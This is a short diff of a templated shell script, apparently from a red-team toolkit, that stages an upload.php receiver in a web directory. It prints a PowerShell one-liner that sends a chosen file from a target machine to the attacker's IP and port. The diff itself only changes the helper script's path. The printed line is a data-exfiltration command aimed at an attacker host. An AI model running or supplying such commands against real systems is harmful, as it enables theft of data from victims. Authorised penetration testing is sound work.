@@ -1,4 +1,4 @@
-mkdir -p packstation/inbound/wwwroot; cp -n <%=$(esh variables/tools_dir)%>/phpserver/upload.php packstation/inbound/wwwroot; \
+mkdir -p packstation/inbound/wwwroot; cp -n <%=$(esh variables/templates_dir)%>/helper_scripts/upload.php packstation/inbound/wwwroot; \
 echo '================================================================'; \
 echo '                      -----PowerShell-----                      '; \
 echo 'Upload data (absolute paths only): (New-Object System.Net.WebClient).UploadFile(\'http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_inbound_port)%>/upload.php\',\'FILE\')'; \
